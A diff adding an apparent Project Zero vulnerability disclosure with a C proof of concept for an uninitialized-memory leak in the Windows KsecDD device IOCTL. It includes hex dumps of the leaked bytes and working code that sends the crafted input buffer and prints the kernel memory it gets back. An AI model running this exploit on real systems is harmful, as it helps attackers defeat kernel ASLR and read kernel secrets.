@@ -1,0 +1,132 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1147
+
+We have discovered that the IOCTL sent to the \Device\KsecDD device by the BCryptOpenAlgorithmProvider documented API returns some uninitialized pool memory in the output buffer. Let's consider the following input data for the IOCTL:
+
+--- cut ---
+00000000: 4d 3c 2b 1a 00 00 02 00 ff ff ff ff 00 00 00 00 M<+.............
+00000010: 20 00 00 00 ff ff ff ff 01 00 00 00 02 00 00 00  ...............
+00000020: 33 00 44 00 45 00 53 00 00 00                   3.D.E.S...
+--- cut ---
+
+On our test Windows 7 32-bit workstation, the layout of the output buffer is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000030: 00 00 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff ff ................
+00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000000c0: 00 00 00 00 00 00 00 00 00 00 ff ff ?? ?? ?? ?? ................
+--- cut ---
+
+Where 00 denote bytes which are properly initialized, while ff indicate uninitialized values copied back to user-mode. As shown above, there are 2 leaked bytes at offsets 0x32-0x33, 2 leaked bytes at offsets 0x6e-0x6f, and 2 leaked bytes at offsets 0xca-0xcb, for a total of 6 disclosed bytes.
+
+The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for ntoskrnl.exe. Then, it is clearly visible that bytes at the aforementioned offsets are equal to the markers inserted by Special Pools, and would otherwise contain leftover data that was previously stored in that memory region:
+
+--- cut ---
+00000000: 01 00 00 00 08 00 00 00 0c 00 00 00 01 00 00 00 ................
+00000010: 28 00 00 00 34 00 00 00 01 00 00 00 70 00 00 00 (...4.......p...
+00000020: 98 00 00 00 ff ff ff ff 33 00 44 00 45 00 53 00 ........3.D.E.S.
+00000030: 00 00[27 27]4d 00 69 00 63 00 72 00 6f 00 73 00 ..''M.i.c.r.o.s.
+00000040: 6f 00 66 00 74 00 20 00 50 00 72 00 69 00 6d 00 o.f.t. .P.r.i.m.
+00000050: 69 00 74 00 69 00 76 00 65 00 20 00 50 00 72 00 i.t.i.v.e. .P.r.
+00000060: 6f 00 76 00 69 00 64 00 65 00 72 00 00 00[27 27]o.v.i.d.e.r...''
+00000070: 74 00 00 00 80 00 00 00 04 00 00 00 94 00 00 00 t...............
+00000080: 4b 00 65 00 79 00 4c 00 65 00 6e 00 67 00 74 00 K.e.y.L.e.n.g.t.
+00000090: 68 00 00 00 80 00 00 00 a0 00 00 00 01 00 00 00 h...............
+000000a0: 62 00 63 00 72 00 79 00 70 00 74 00 70 00 72 00 b.c.r.y.p.t.p.r.
+000000b0: 69 00 6d 00 69 00 74 00 69 00 76 00 65 00 73 00 i.m.i.t.i.v.e.s.
+000000c0: 2e 00 64 00 6c 00 6c 00 00 00[27 27]?? ?? ?? ?? ..d.l.l...''....
+--- cut ---
+00000000: 01 00 00 00 08 00 00 00 0c 00 00 00 01 00 00 00 ................
+00000010: 28 00 00 00 34 00 00 00 01 00 00 00 70 00 00 00 (...4.......p...
+00000020: 98 00 00 00 ff ff ff ff 33 00 44 00 45 00 53 00 ........3.D.E.S.
+00000030: 00 00[85 85]4d 00 69 00 63 00 72 00 6f 00 73 00 ....M.i.c.r.o.s.
+00000040: 6f 00 66 00 74 00 20 00 50 00 72 00 69 00 6d 00 o.f.t. .P.r.i.m.
+00000050: 69 00 74 00 69 00 76 00 65 00 20 00 50 00 72 00 i.t.i.v.e. .P.r.
+00000060: 6f 00 76 00 69 00 64 00 65 00 72 00 00 00[85 85]o.v.i.d.e.r.....
+00000070: 74 00 00 00 80 00 00 00 04 00 00 00 94 00 00 00 t...............
+00000080: 4b 00 65 00 79 00 4c 00 65 00 6e 00 67 00 74 00 K.e.y.L.e.n.g.t.
+00000090: 68 00 00 00 80 00 00 00 a0 00 00 00 01 00 00 00 h...............
+000000a0: 62 00 63 00 72 00 79 00 70 00 74 00 70 00 72 00 b.c.r.y.p.t.p.r.
+000000b0: 69 00 6d 00 69 00 74 00 69 00 76 00 65 00 73 00 i.m.i.t.i.v.e.s.
+000000c0: 2e 00 64 00 6c 00 6c 00 00 00[85 85]?? ?? ?? ?? ..d.l.l.........
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <bcrypt.h>
+#include <winternl.h>
+#include <cstdio>
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  HANDLE hksecdd;
+  OBJECT_ATTRIBUTES objattr;
+  UNICODE_STRING ksecdd_name;
+  IO_STATUS_BLOCK iob;
+  NTSTATUS st;
+
+  RtlInitUnicodeString(&ksecdd_name, L"\\Device\\KsecDD");
+  InitializeObjectAttributes(&objattr, &ksecdd_name, 0, NULL, 0);
+  st = NtOpenFile(&hksecdd,
+                  FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
+                  &objattr,
+                  &iob,
+                  FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                  FILE_SYNCHRONOUS_IO_NONALERT);
+  if (!NT_SUCCESS(st)) {
+    printf("NtOpenFile failed, %x\n", st);
+    return 1;
+  }
+
+  BYTE InputBuffer[] = "\x4d\x3c\x2b\x1a\x00\x00\x02\x00\xff\xff\xff\xff\x00\x00\x00\x00\x20\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x02\x00\x00\x00\x33\x00\x44\x00\x45\x00\x53\x00\x00\x00";
+  BYTE OutputBuffer[0x200] = { /* zero padding */ };
+  DWORD BytesReturned = 0;
+  if (!DeviceIoControl(hksecdd, 0x390400, InputBuffer, sizeof(InputBuffer), OutputBuffer, sizeof(OutputBuffer), &BytesReturned, NULL)) {
+    printf("DeviceIoControl failed, %d\n", GetLastError());
+    CloseHandle(hksecdd);
+    return 1;
+  }
+
+  PrintHex(OutputBuffer, BytesReturned);
+
+  CloseHandle(hksecdd);
+
+  return 0;
+}
